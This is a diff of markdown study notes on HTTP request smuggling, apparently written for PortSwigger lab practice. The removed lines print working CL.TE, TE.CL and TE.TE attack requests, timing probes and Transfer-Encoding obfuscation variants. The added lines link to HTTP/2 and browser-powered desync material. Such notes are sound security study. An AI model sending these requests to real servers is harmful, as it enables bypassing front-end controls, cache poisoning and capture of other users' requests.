@@ -21,208 +21,42 @@ q=smuggling
 
 Since the HTTP specification provides two different methods for specifying the length of HTTP messages, it is possible for a single message to use both methods at once, such that they conflict with each other.
 
-# Detecting HTTP request smuggling vulnerabilities
+## Detecting HTTP request smuggling vulnerabilities
 
 Request smuggling attacks involve placing both the `Content-Length` header and the `Transfer-Encoding` header into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers:
 
--   **CL.TE**: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
--   **TE.CL**: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
--   **TE.TE**: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.
+-   **[CL.TE](CL.TE%20smuggling%20vulnerabilities.md)**: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
+-   **[TE.CL](TE.CL%20smuggling%20vulnerabilities.md)**: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
+-   **[TE.TE](TE.TE%20smuggling%20vulnerabilities.md)**: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.
 
-## CL.TE vulnerabilities
+## Detecting HTTP/2 request smuggling vulnerabilities
 
-The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header:
+>[!TLDR] Research: 
+> [HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2)
 
-Smuggling request:
-```http
-POST / HTTP/1.1
-Host: 0acd00da03a2776381c07ff100b10027.web-security-academy.net
-Content-Length: 7
-Transfer-Encoding: chunked
+[HTTP/2](HTTP-2.md) messages are sent over the wire as a series of separate "frames". Each frame is preceded by an explicit length field, which tells the server exactly how many bytes to read in. Therefore, the length of the request is the sum of its frame lengths.
 
-0
+In theory, this mechanism means there is no opportunity for an attacker to introduce the ambiguity required for request smuggling, as long as the website uses HTTP/2 end to end. In the wild, however, this is often not the case due to the widespread but dangerous practice of **[HTTP/2 downgrading](HTTP-2%20downgrading.md)**.
 
-G
-```
+-   **[H2.CL](H2.CL%20smuggling%20vulnerabilities.md)**: the front-end servers will simply reuse `Content-Length` header's value in the resulting HTTP/1 request instead of suing it's own value
+-   **[H2.TE](H2.TE%20smuggling%20vulnerabilities.md)**: the back-end server do not strip the `Transfer-Encoding` header when downgrading requests to HTTP/1
 
-Request sent after get smuggled (the `G` sent before is prepended to `POST`):
-```http
-GPOST /post/comment HTTP/1.1
-Host: 0acd00da03a2776381c07ff100b10027.web-security-academy.net
+---
 
-csrf=rMS2qQHV8HyyZJbcBKObOO78FbBQwIyZ&postId=5&comment=asd&name=asd&email=asd%40asd.asd&website=
+# Browser-powered request smuggling
 
+> [!tldr] Research:
+> [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks)
 
-HTTP/1.1 403 Forbidden
-"Unrecognized method GPOST"
-```
+Browser-powered request smuggling attacks turn victim's web browser into a desync delivery platform, shifting the request smuggling frontier by **exposing single-server websites** and internal networks.
 
-### Find CL.TE using timings
+-   **[CL.0](CL.0%20smuggling%20vulnerabilities.md)**: Back-end servers can be persuaded to ignore the `Content-Length` header and ignore the body of incoming requests.
+-   **[H2.0](H2.0%20smuggling%20vulnerabilities.md)**: same as CL.0 when the server performs [HTTP/2 downgrading](HTTP-2%20downgrading.md)
+-   **[Client-side desync attacks](Client-side%20desync%20attacks.md)**: is an attack that makes the victim's web browser desynchronize its own connection to the vulnerable website.
 
->[!note] Note
->Since the front-end server uses the `Content-Length` header, it will forward only part of this request, omitting the `G`. The back-end server uses the `Transfer-Encoding` header, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay.
+---
 
-```http
-POST / HTTP/1.1
-Host: 0acd00da03a2776381c07ff100b10027.web-security-academy.net
-Content-Length: 4
-Transfer-Encoding: chunked
-
-1
-A
-G
-```
-
-### Confirming CL.TE vulnerabilities using differential responses
-
-Attack request:
-```http
-POST / HTTP/1.1
-Host: 0a0000f7040caa64807e80a800d50021.web-security-academy.net
-Cookie: session=YMVczDiZYma5L95S4fFbNXnGVYonnrlD
-Content-Length: 30
-Transfer-Encoding: chunked
-Connection: close
-
-0
-
-POST /404 HTTP/1.1
-foo: 
-```
-
-If the attack is successful, then the last two lines of this request are treated by the back-end server as belonging to the next request that is received.
-This will cause the subsequent "normal" request to look like this:
-```http
-POST /404 HTTP/1.1
-foo:POST / HTTP/1.1
-Host: 0a0000f7040caa64807e80a800d50021.web-security-academy.net
-Cookie: session=YMVczDiZYma5L95S4fFbNXnGVYonnrlD
-Content-Length: 3
-
-a=b
-```
-
-## TE.CL vulnerabilities
-
-The front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header:
-
-```http
-POST / HTTP/1.1
-Host: 0a51002b038f542d807e6c3b001900de.web-security-academy.net
-Transfer-Encoding: chunked
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 4
-
-9d
-GPOST / HTTP/1.1
-Host: 0a51002b038f542d807e6c3b001900de.web-security-academy.net
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 15
-
-x=1
-0
-```
-
-### Find TE.CL using timings
-
->[!note] Note
->Since the front-end server uses the `Transfer-Encoding` header, it will forward only part of this request, omitting the `X`. The back-end server uses the `Content-Length` header, expects more content in the message body, and waits for the remaining content to arrive. This will cause an observable time delay.
-
-```http
-POST / HTTP/1.1
-Host: vulnerable-website.com
-Transfer-Encoding: chunked
-Content-Length: 6
-
-0
-
-X
-```
-
-### Confirming TE.CL vulnerabilities using differential responses
-
-Attack request:
-```http
-POST / HTTP/1.1
-Host: 0ac700e7043c13ce850119ed00ea00d4.web-security-academy.net
-Transfer-Encoding: chunked
-Content-Length: 4
-
-73
-POST /404 HTTP/1.1
-Host: 0ac700e7043c13ce850119ed00ea00d4.web-security-academy.net
-Content-Length: 150
-
-foo=bar
-0
-```
-
-If the attack is successful, then everything from `POST /404` onwards is treated by the back-end server as belonging to the next request that is received. This will cause the subsequent "normal" request to look like this:
-```http
-POST /404 HTTP/1.1
-Host: 0ac700e7043c13ce850119ed00ea00d4.web-security-academy.net
-Content-Length: 150
-
-foo=bar
-0
-
-POST / HTTP/1.1
-Host: 0ac700e7043c13ce850119ed00ea00d4.web-security-academy.net
-Transfer-Encoding: chunked
-Content-Length: 4
-```
-
-## TE.TE vulnerabilities (obfuscating TE header)
-
-The front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.
-
-Some obfuscation examples:
-```http
-Transfer-Encoding: xchunked
-
-Transfer-Encoding : chunked
-
-Transfer-Encoding: chunked
-Transfer-Encoding: x
-
-Transfer-Encoding:[tab]chunked
-
-[space]Transfer-Encoding: chunked
-
-X: X[\n]Transfer-Encoding: chunked
-
-Transfer-Encoding
-: chunked
-```
-
-To uncover a TE.TE vulnerability, it is necessary to find some variation of the `Transfer-Encoding` header such that only one of the front-end or back-end servers processes it, while the other server ignores it.
-
-```http
-POST / HTTP/1.1
-Host: 0a6a008e033bed808147e98200020068.web-security-academy.net
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Content-length: 4
-Content-Type: application/x-www-form-urlencoded
-Transfer-Encoding: chunked
-Transfer-Encoding: foo
-
-a1
-GPOST / HTTP/1.1
-Host: 0a6a008e033bed808147e98200020068.web-security-academy.net
-Content-Type: application/x-www-form-urlencoded
-Content-length: 15
-
-foo=bar
-0
-
-
-```
-
-# Exploiting HTTP Request Smuggling
+# Exploiting HTTP & HTTP/2 Request Smuggling
 
 - [Bypass front-end security controls](Exploiting%20HTTP%20Request%20Smuggling.md#Bypass%20front-end%20security%20controls)
 - [Revealing front-end request rewriting](Exploiting%20HTTP%20Request%20Smuggling.md#Revealing%20front-end%20request%20rewriting)
@@ -232,8 +66,13 @@ foo=bar
 - [Using request smuggling to turn an on-site redirect into an open redirect](Exploiting%20HTTP%20Request%20Smuggling.md#Using%20request%20smuggling%20to%20turn%20an%20on-site%20redirect%20into%20an%20open%20redirect)
 - [Using request smuggling to perform web cache poisoning](Exploiting%20HTTP%20Request%20Smuggling.md#Using%20request%20smuggling%20to%20perform%20web%20cache%20poisoning)
 - [Using request smuggling to perform web cache deception](Exploiting%20HTTP%20Request%20Smuggling.md#Using%20request%20smuggling%20to%20perform%20web%20cache%20deception)
-
+- [Request smuggling via CRLF injection](Exploiting%20HTTP-2%20Request%20Smuggling.md#Request%20smuggling%20via%20CRLF%20injection)
+- [Response queue poisoning](Exploiting%20HTTP%20Request%20Smuggling.md#Response%20queue%20poisoning)
+- [HTTP request tunneling](Exploiting%20HTTP-2%20Request%20Smuggling.md#HTTP%20request%20tunneling)
+- [Exploiting CL.0 & H2.0 vulnerabilities](Exploiting%20Browser-powered%20Request%20Smuggling.md#Exploiting%20CL.0%20&%20H2.0%20vulnerabilities)
 
 # External researches
 
 - [HTTP Desync Attacks: Request Smuggling Reborn, PortSwigger](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
+- https://portswigger.net/research/http2
+- [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling, PortSwigger](https://portswigger.net/research/browser-powered-desync-attacks)
